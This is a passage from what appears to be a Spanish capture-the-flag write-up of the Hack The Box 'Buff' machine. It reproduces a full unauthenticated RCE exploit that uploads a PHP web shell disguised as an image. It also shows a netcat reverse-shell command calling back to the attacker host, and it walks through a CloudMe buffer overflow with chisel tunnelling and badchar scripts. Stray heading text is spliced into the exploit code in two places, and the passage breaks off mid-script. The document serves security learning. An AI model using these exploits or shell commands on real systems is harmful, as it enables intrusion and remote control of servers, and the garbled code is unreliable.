\u0026#39;id\u0026#39; SQL Injection | php/webapps/48936.txt Gym Management System 1.0 - Authentication Bypass | php/webapps/48940.txt Gym Management System 1.0 - Stored Cross Site Scripting | php/webapps/48941.txt Gym Management System 1.0 - Unauthenticated Remote Code Execution | php/webapps/48506.py GYM MS - GYM Management System - Cross Site Scripting (Stored) | php/webapps/51777.txt WordPress Plugin WPGYM - SQL Injection | php/webapps/42801.txt -------------------------------------------------------------------- --------------------------------- Lo copiamos al directorio actual de trabajo\n\u0026gt; searchsploit -m php/webapps/48506.py Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution URL: https://www.exploit-db.com/exploits/48506 Path: /usr/share/exploitdb/exploits/php/webapps/48506.py Codes: N/A Verified: False File Type: Python script, ASCII text executable cp: overwrite \u0026#39;/home/d3b0o/Desktop/buff/48506.py\u0026#39;? y Copied to: /home/d3b0o/Desktop/buff/48506.py Este sería el exploit:\nimport requests, sys, urllib, re from colorama import Fore, Back, Style requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) def webshell(SERVER_URL, session): try: WEB_SHELL = SERVER_URL+\u0026#39;upload/kamehameha.php\u0026#39; getdir = {\u0026#39;telepathy\u0026#39;: \u0026#39;echo %CD%\u0026#39;} r2 = session.get(WEB_SHELL, params=getdir, verify=False) status = r2.status_code if status != 200: print Style.BRIGHT+Fore.RED+\u0026#34;[!] \u0026#34;+Fore.RESET+\u0026#34;Could not connect to the webshell.\u0026#34;+Style.RESET_ALL r2.raise_for_status() print(Fore.GREEN+\u0026#39;[+] \u0026#39;+Fore.RESET+\u0026#39;Successfully connected to webshell.\u0026#39;) cwd = re.findall(\u0026#39;[CDEF].*\u0026#39;, r2.text) cwd = cwd[0]+\u0026#34;\u0026gt; \u0026#34; term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET while True: thought = raw_input(term) command = {\u0026#39;telepathy\u0026#39;: thought} r2 = requests.get(WEB_SHELL, params=command, verify=False) status = r2.status_code if status != 200: r2.raise_for_status() response2 = r2.text print(response2) except: print(\u0026#34;\\r\\nExiting.\u0026#34;) sys.exit(-1) def formatHelp(STRING): return Style.BRIGHT+Fore.RED+STRING+Fore.RESET def header(): BL = Style.BRIGHT+Fore.GREEN RS = Style.RESET_ALLomo instalar mona.py en Immunity Debugger FR = Fore.RESET SIG = BL+\u0026#39; /\\\\\\n\u0026#39;+RS SIG += Fore.YELLOW+\u0026#39;/vvvvvvvvvvvv \u0026#39;+BL+\u0026#39;\\\\\u0026#39;+FR+\u0026#39;--------------------------------------,\\n\u0026#39; SIG += Fore.YELLOW+\u0026#39;`^^^^^^^^^^^^\u0026#39;+BL+\u0026#39; /\u0026#39;+FR+\u0026#39;============\u0026#39;+Fore.RED+\u0026#39;BOKU\u0026#39;+FR+\u0026#39;=====================\u0026#34;\\n\u0026#39; SIG += BL+\u0026#39; \\/\u0026#39;+RS+\u0026#39;\\n\u0026#39; return SIG if __name__ == \u0026#34;__main__\u0026#34;: print header(); if len(sys.argv) != 2: print formatHelp(\u0026#34;(+) Usage:\\t python %s \u0026lt;WEBAPP_URL\u0026gt;\u0026#34; % sys.argv[0]) print formatHelp(\u0026#34;(+) Example:\\t python %s \u0026#39;https://10.0.0.3:443/gym/\u0026#39;\u0026#34; % sys.argv[0]) sys.exit(-1) SERVER_URL = sys.argv[1] UPLOAD_DIR = \u0026#39;upload.php?id=kamehameha\u0026#39; UPLOAD_URL = SERVER_URL + UPLOAD_DIR s = requests.Session() s.get(SERVER_URL, verify=False) PNG_magicBytes = \u0026#39;\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\u0026#39; png = { \u0026#39;file\u0026#39;: ( \u0026#39;kaio-ken.php.png\u0026#39;, PNG_magicBytes+\u0026#39;\\n\u0026#39;+\u0026#39;\u0026lt;?php echo shell_exec($_GET[\u0026#34;telepathy\u0026#34;]); ?\u0026gt;\u0026#39;, \u0026#39;image/png\u0026#39;, {\u0026#39;Content-Disposition\u0026#39;: \u0026#39;form-data\u0026#39;} ) } fdata = {\u0026#39;pupload\u0026#39;: \u0026#39;upload\u0026#39;} r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False) webshell(SERVER_URL, s) Básicamente, lo que hace es subir un archivo el cual lo llama kaio-ken.php.png en el /upload.php. Dentro del archivo le mete los magic bytes de PNG para que se piense que el contenido es un png (x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a). A continuación hay un ejemplo de como usar esta técnica para hacer que un script de php se piense que es un GIF\n\u0026gt; cat test.php ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: test.php ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ \u0026lt;?php 2 │ echo \u0026#34;Test\u0026#34; 3 │ ?\u0026gt; ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────── \u0026gt; file test.php test.php: PHP script, ASCII text \u0026gt; cat test.php ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: test.php ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ GIF8; 2 │ \u0026lt;?php 3 │ echo \u0026#34;Test\u0026#34; 4 │ ?\u0026gt; ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────── \u0026gt; file test.php test.php: GIF image data 16188 x 26736 Para que se entienda mejor vamos a cambiar los magic bytes del script a los de GIF8;, aunque tal y como viene por default ya funciona\nPNG_magicBytes = \u0026#39;GIF8;\u0026#39; Por último ejecutamos el script\n\u0026gt; python2 48506.py http://10.10.10.198:8080/ /usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. /\\omo instalar mona.py en Immunity Debugger /vvvvvvvvvvvv \\--------------------------------------, `^^^^^^^^^^^^ /============BOKU=====================\u0026#34; \\/ [+] Successfully connected to webshell. F8;\u0026gt; Ahora ya tenemos una shell que en verdad no es una shell, me explico, simplemente hemos subido un script en php que ejecuta todo lo que le pasamos por el parámetro telepathy\n\u0026gt; curl \u0026#34;http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami\u0026#34; GIF8; buff\\shaun Qué código tiene kamehameha.php que nos permite ejecutar comandos?\rEl archivo kamehameha.php tiene el siguiente código\n\u0026lt;?php echo shell_exec($_GET[\u0026#34;telepathy\u0026#34;]); ?\u0026gt; Lo que hace básicamente es pasarle a la función shell_exec todo lo que recibe por GET por el parámetro telepathy.\nLa función shell_exec lo que hace es ejecutar comandos en el sistema, pero no muestra el output, para hacer que muestre el output hay que poner el echo delante\nSin echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php Con echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo Si shell_exec no funcionara o está bloqueado, se pueden usar otras funciones, a continuación os dejo unos ejemplos\nsystem()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php system(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo passthru()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php passthru(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo exec()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo popen()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php 2 $handle = popen(\u0026#39;whoami\u0026#39;, \u0026#39;r\u0026#39;); 3 $read = fread($handle, 2096); 4 pclose($handle); 5 echo $read; 6 ?\u0026gt; 7 d3bo~\u0026gt; php test.php d3bo Vamos a usar este RCE para mandarnos una Reverse Shell en condiciones.\nPara ello primero buscamos un nc.exe que normalmente en kali ya viene instalado, después nos lo movemos al directorio actual y abrimos un servidor con samba para poder ejecutarlo desde la otra máquina\n\u0026gt; locate nc.exe /home/d3b0o/Desktop/buff/nc.exe /opt/SecLists/Web-Shells/FuzzDB/nc.exe /usr/lib/mono/4.5/cert-sync.exe /usr/share/seclists/Web-Shells/FuzzDB/nc.exe /usr/share/windows-resources/binaries/nc.exe \u0026gt; cp /usr/share/windows-resources/binaries/nc.exe . \u0026gt; impacket-smbserver smb $(pwd) -smb2support Impacket v0.11.0 - Copyright 2023 Fortra [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed Nos ponemos en escucha por el puerto 443\nrlwrap nc -nlvp 443 Por último aprovechándonos del RCE vamos a ejecutar el siguiente comando\n//10.10.14.31/smb/nc.exe -e cmd 10.10.14.31 443 curl -s -G \u0026#34;http://10.10.10.198:8080/upload/kamehameha.php\u0026#34; --data-urlencode \u0026#34;telepathy=//10.10.14.31/smb/nc.exe -e cmd 10.10.14.31 443\u0026#34; ¡Recibimos la reverse shell !!!\nAnalizando la vulnerabilidad ¿Porque conseguimos ejecutar comandos? Que está mal en el código del upload.php?\nDentro de los exploits de exploidb suele haber un enlace para descargar la aplicación vulnerable, en este caso el enlace es https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/\nDesde ahí, nos descargamos el código. Una vez descargado y descomprimido podemos ver el contenido del archivo upload.php que es el que hemos usado para subir un archivo php malicioso\n\u0026lt;?php include_once \u0026#39;include/db_connect.php\u0026#39;; include_once \u0026#39;include/functions.php\u0026#39;; $user = $_GET[\u0026#39;id\u0026#39;]; $allowedExts = array(\u0026#34;jpg\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;gif\u0026#34;, \u0026#34;png\u0026#34;,\u0026#34;JPG\u0026#34;); $extension = @end(explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])); if(isset($_POST[\u0026#39;pupload\u0026#39;])){ if ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/JPG\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 20000000000000) \u0026amp;\u0026amp; in_array($extension, $allowedExts)) { if ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] \u0026gt; 0) { echo \u0026#34;Return Code: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if (file_exists(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])) { unlink(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); } else { $pic=$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $conv=explode(\u0026#34;.\u0026#34;,$pic); $ext=$conv[\u0026#39;1\u0026#39;]; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34;. $user.\u0026#34;.\u0026#34;.$ext); $url=$user.\u0026#34;.\u0026#34;.$ext; $query=\u0026#34;update members set pic=1, picName=\u0026#39;$url\u0026#39; where id=\u0026#39;$user\u0026#39;\u0026#34;; if($upl=$mysqli-\u0026gt;query($query)){ header(\u0026#34;location: profile/i.php\u0026#34;); } } } } else header(\u0026#34;location: /profile/i.php\u0026#34;); } ?\u0026gt; Al principio del script se declaran unas variables:\nuser, que equivale a lo que le pasamos por get, por el parámetro id, allowedExts, esta variable es una array con todas las extensiones permitidas (jpg,png,gif\u0026hellip;) extensión, guarda la extensión del archivo de la siguiente forma $extension = @end(explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])); Está haciendo uso de la función explode para separar el nombre en distintas partes separadas por \u0026ldquo;.\u0026rdquo;\nd3bo\u0026gt; cat test.php 1 \u0026lt;?php 2 $test = explode(\u0026#34;.\u0026#34;, \u0026#34;test.php.png\u0026#34; ); 3 print_r($test) 4 ?\u0026gt; d3bo\u0026gt; php test.php Array ( [0] =\u0026gt; test [1] =\u0026gt; php [2] =\u0026gt; png ) Además añade @end para que solo muestre el último\nd3bo\u0026gt; cat test.php 1 \u0026lt;?php 2 $test = @end(explode(\u0026#34;.\u0026#34;, \u0026#34;test.php.png\u0026#34; )); 3 echo $test 4 ?\u0026gt; d3bo\u0026gt; php test.php png Con esto consigue sacar la extensión del archivo.\nEl código sigue con lo siguiente\nif ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/JPG\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/pjpeg\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 20000000000000) \u0026amp;\u0026amp; in_array($extension, $allowedExts)) Aquí está haciendo 3 comprobaciones\nContent-Type: Primero comprueba si el content type es image/gif o image/jpeg o image/JPG o image/png o image/pjpeg Tamaño: También comprueba que el archivo sea más pequeño que 20,000,000,000,000 bytes Extensión: Por último comprueba que la extensión del archivo este en la array allowedExts Si pasa todas estas validaciones pasa al la siguiente sección\n$pic=$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $conv=explode(\u0026#34;.\u0026#34;,$pic); $ext=$conv[\u0026#39;1\u0026#39;]; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34;. $user.\u0026#34;.\u0026#34;.$ext); $url=$user.\u0026#34;.\u0026#34;.$ext; Aquí es donde empieza la vulnerabilidad\nVuelve a dividir el nombre en una array con la función explode usando de separador el \u0026ldquo;.\u0026rdquo; y guarda en la variable ext la posición 1 de la array. Después sube el archivo con el nombre del usuario que pasamos por GET y la extensión.\nEl problema es que no se está calculando bien la extensión, ya que si probamos de poner 2 extensiones, se queda con la primera\nd3bo\u0026gt; cat test2.php 1 \u0026lt;?php 2 $pic=\u0026#34;shell.php.png\u0026#34;; 3 $conv=explode(\u0026#34;.\u0026#34;,$pic); 4 $ext=$conv[\u0026#39;1\u0026#39;]; 5 echo $ext 6 ?\u0026gt; d3bo\u0026gt; php test2.php php El nombre shell.php.png pasaría todas las validaciones porque es un png, pero cuando se suba lo guardará con el nombre del usuario y la extensión php, ya que coge la 1 posición de la array en vez de la última\nPara que no pasara esto se tendría que usar \u0026lsquo;@end\u0026rsquo; como se hacía al principio del código\nd3bo\u0026gt; cat test2.php 1 \u0026lt;?php 2 $pic=\u0026#34;shell.php.png\u0026#34;; 3 $conv=explode(\u0026#34;.\u0026#34;,$pic); 4 $ext=@end($conv); 5 echo $ext 6 ?\u0026gt; d3bo\u0026gt; php test2.php png Podemos probar todo esto creando nuestro propio script\n\u0026gt; cat exploit.py 1 │ import requests 2 │ 3 │ def subir_archivo(s): 4 │ url = \u0026#39;http://10.10.10.198:8080/upload.php?id=user2\u0026#39; 5 │ contenido_archivo = \u0026#39;GIF8;\\n \u0026lt;?php system(\u0026#34;whoami\u0026#34;) ?\u0026gt;\u0026#39; 6 │ archivo = {\u0026#39;file\u0026#39;: (\u0026#39;shell.php.gif\u0026#39;, contenido_archivo, \u0026#39;image/gif\u0026#39;)} 7 │ fdata = {\u0026#39;pupload\u0026#39;: \u0026#39;upload\u0026#39;} 8 │ try: 9 │ respuesta = s.post(url, files=archivo, data=fdata) 10 │ except Exception as e: 11 │ print(\u0026#34;Error al realizar la solicitud:\u0026#34;, e) 12 │ 13 │ s = requests.Session() 14 │ subir_archivo(s) 15 │ r = s.get(\u0026#34;http://10.10.10.198:8080/upload/user2.php\u0026#34;) 16 │ print(r.text) \u0026gt; python3 exploit.py GIF8; buff\\shaun Escalada de privilegios Dentro del directorio de Downloads hay un archivo llamado CloudMe_1112.exe\nC:\\Users\\shaun\u0026gt;tree /f 3D Objects Contacts Desktop user.txt Documents Tasks.bat Downloads CloudMe_1112.exe .... Con una búsqueda rápida por google se puede encontrar porque puerto funciona por defecto CloudMe (8888)\nCon un netstat -a podemos ver que el puerto 8888 está abierto en local\nC:\\xampp\\htdocs\\gym\\upload\u0026gt;netstat -a netstat -a Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 BUFF:0 LISTENING TCP 0.0.0.0:445 BUFF:0 LISTENING TCP 0.0.0.0:5040 BUFF:0 LISTENING TCP 0.0.0.0:7680 BUFF:0 LISTENING TCP 0.0.0.0:8080 BUFF:0 LISTENING TCP 0.0.0.0:49664 BUFF:0 LISTENING TCP 0.0.0.0:49665 BUFF:0 LISTENING TCP 0.0.0.0:49666 BUFF:0 LISTENING TCP 0.0.0.0:49667 BUFF:0 LISTENING TCP 0.0.0.0:49668 BUFF:0 LISTENING TCP 0.0.0.0:49669 BUFF:0 LISTENING TCP 10.10.10.198:139 BUFF:0 LISTENING TCP 10.10.10.198:8080 10.10.14.31:55448 ESTABLISHED TCP 10.10.10.198:49771 10.10.14.31:https ESTABLISHED TCP 127.0.0.1:3306 BUFF:0 LISTENING TCP 127.0.0.1:8888 BUFF:0 LISTENING Con un searchsploit encontramos que la versión del programa que había en la carpeta de \u0026lsquo;Downloads\u0026rsquo; es vulnerable a un Buffer Overflow.\n\u0026gt; searchsploit CloudMe 1.11.2 ----------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- CloudMe 1.11.2 - Buffer Overflow (PoC) | windows/remote/48389.py CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR) | windows/local/48499.txt CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR) | windows/local/48840.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt | windows/remote/46218.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass) | windows_x86-64/remote/46250.py ----------------------------------------------------------------------------- --------------------------------- Podríamos usar el script de exploitdb, pero vamos a hacerlo manual.\nBuffer Overflow Primero de todo vamos a usar una máquina virtual con un windows 7 de 32 Bits, dentro del windows vamos a instalar CloudMe 1.11.2, Immunity Debuger y mona.py\nEl Immunity Debuger lo vamos a usar para analizar el binario durante la ejecución. El CloudMe 1.11.2 va a estar ejecutándose en nuestra, máquina para poder analizarlo y simular ataques como si fuera la máquina víctima mona.py Mona.py es un script en python que funciona con Immunity Debuger, vamos a usarlo para automatizar distintos procesos durante la explotación del buffer overflow Como instalar mona.py en Immunity Debugger\rDescargamos el archivo de github\nhttps://raw.githubusercontent.com/corelan/mona/master/mona.py\nY lo movemos a C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands\nLo siguiente es ejecutar el CloudMe 1.11.2 para ello necesitamos crear una cuenta de CloudMe.\nPortfordwarding Si recordamos CloudMe funciona por el puerto 8888 en local así que no podemos ver este puerto desde el Kali, por lo que tenemos que hacer portforwarding, para ello usamos Chisel\nEn la máquina atacante nos descargamos Chisel y lo ejecutamos\nsudo ./chisel server --reverse -p 1234 Explicación parámetros\rParámetro Función -p Especificamos el puerto por el cual vamos a tener el servidor chisel server Abre chisel en modo servidor \u0026ndash;reverse Permite a los clientes configurar reenvíos de puertos inversos En el windows vamos a descargar también Chisel y lo ejecutamos\nchisel.exe client 192.168.1.145:1234 R:8888:127.0.0.1:8888 Explicación parámetros\rParámetro Función 192.168.1.145:1234 Especificamos la ip de la máquina atacante en la cual tenemos el chisel en modo server y el puerto en el cual tenemos chisel corriendo client Abre chisel en modo cliente R:8888:127.0.0.1:8888 Indicamos que el puerto 8888 de la máquina Windows se mapee al puerto 8888 de la máquina atacante. Lo que significa que ahora el puerto 8888 de la máquina atacante es el mismo que el 8888 de la máquina Windows Para comprobar que ha funcionado todo correcto podemos comprobar si el puerto 8888 se ha abierto en nuestro kali, de la siguiente forma:\nss -tnlp | grep 8888 LISTEN 0 4096 *:8888 *:* Explicación parámetros\rParámetro Función ss Se usa para mostrar información sobre los sockets de red, como conexiones TCP, UDP y estadísticas de socket -t Muestra únicamente las conexiones TCP. -n Muestra las direcciones y puertos numéricamente en lugar de resolver nombres. -l Muestra solo las conexiones en estado de escucha (listening). -p Muestra los procesos asociados con los sockets. grep En este caso lo usamos para filtrar por la línea que contenga el puerto 8888 Calcular Offset Empezamos mandando muchos caracteres para ver si la aplicación deja de funcionar\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*7000\u0026#39; | nc 127.0.0.1 8888 Ahora en el windows aparece el siguiente mensaje\nPara saber por qué crashea vamos a abrirlo otra vez y hacer un attach (File\u0026gt;Attach\u0026gt;CloudMe) desde Immunity Debugger, y le damos al play\nRepetimos el mismo proceso de mandar un input grande\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*7000\u0026#39; | nc 127.0.0.1 8888 Ahora desde immunity debugger podemos ver que hay registros como el EIP,ESP,EBP,\u0026hellip; que tienen de valor 41, el 41 es el resultado del carácter \u0026lsquo;A\u0026rsquo; en hexadecimal, esto significa que al poner una cadena más larga que el tamaño de buffer que tenía asignada la variable, se han sobreescrito registros de la memoria para poder guardar las \u0026lsquo;A\u0026rsquo;. El problema está en que por ejemplo si cambiamos el valor del EIP el programa no sabe por donde continuar, ya que el EIP \u0026ldquo;Instruction Pointer\u0026rdquo; (Puntero de Instrucción) contiene la dirección de la memoria de la próxima instrucción, si le ponemos una dirección que no existe como en este caso 41414141, simplemente deja de funcionar.\nVamos a ver cuantas A tenemos que poner para llegar hasta el EIP, para ello vamos a crear una cadena especialmente diseñada para esto\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 7000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3A... Explicación parámetros\rParámetro Función -l 7000 Especificamos la cantidad de caracteres que va a tener la cadena Se lo mandamos a CloudMe\n\u0026gt; nc 127.0.0.1 8888 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1A... Obviamente, CloudMe se ha vuelto a petar, pero si observamos el EIP, vemos que ahora vale 316A4230.\nCon el siguiente comando se calcula automáticamente el offset (La cantidad de \u0026lsquo;A\u0026rsquo;) para llegar al EIP\n\u0026gt; /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 7000 -q 316A4230 [*] Exact match at offset 1052 Explicación parámetros\rParámetro Función -l 7000 Especificamos la cantidad de caracteres que tenía la cadena -q 316A4230 Con -q ponemos los caracteres que salen en el EIP El comando nos dice que el offset es 1052.\nPara comprobarlo mandaremos 1052 \u0026lsquo;A\u0026rsquo; y 4 \u0026lsquo;B\u0026rsquo;, si el cálculo ha salido bien deberíamos ver desde immunity debugger que el eip vale 42424242 que es BBBB en hexadecimal\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*1052 + \u0026#34;B\u0026#34;*4\u0026#39; | nc 127.0.0.1 8888 Efectivamente, después de ejecutar esto el EIP pasa a valer 42424242 que es lo mismo que BBBB, esto sígnica que ya tenemos el control del EIP y por ende el control del flujo del programa.\nEsto lo vamos a usar para modificar el EIP para que salte al ESP y dentro del ESP vamos a cargar unas instrucciones para ejecutar comandos.\nMandamos el mismo payload que antes, pero ahora con 2000 C que van a representar las intrucciones que pondremos más tarde.\npython2 -c \u0026#39;print \u0026#34;A\u0026#34;*1052 + \u0026#34;B\u0026#34;*4 + \u0026#34;C\u0026#34;*200\u0026#39; | nc 127.0.0.1 8888 Desde el Immunity Debugger vemos que el ESP comienza justo después del EIP.\nBadchars ¿Qué es un badchar?\nUn \u0026ldquo;badchar\u0026rdquo; es un carácter que, cuando se procesa, puede causar problemas porque el sistema no lo interpreta de la manera esperada.\n¿Como podríamos comprobar si hay algún carácter que no se procesa bien?, pues mandando todos los tipos de caracteres y ver si dan errores.\nHasta ahora hemos estado mandando onelines de python, pero ahora vamos a hacer un script porque vamos a tener que añadir más cosas\nfrom pwn import * from struct import pack offset = 1052 before_eip = b\u0026#34;A\u0026#34; * offset eip = b\u0026#34;BBBB\u0026#34; payload = before_eip + eip host, port = \u0026#34;127.0.0.1\u0026#34;, 8888 r = remote(host, port) r.sendline(payload) A este script le tenemos que añadir los caracteres que comprobaremos si son badchars. Para sacar la lista usaremos el programa badchars que lo podemos instalar con pip\n\u0026gt; pip3 install badchars \u0026gt; badchars -f python badchars = ( \u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; \u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; \u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; \u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; \u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; \u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; \u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; \u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; \u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34; ) from pwn import * from struct import pack offset = 1052 before_eip = b\u0026#34;A\u0026#34; * offset eip = b\u0026#34;BBBB\u0026#34; badchars = ( b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; b\u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; b\u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; 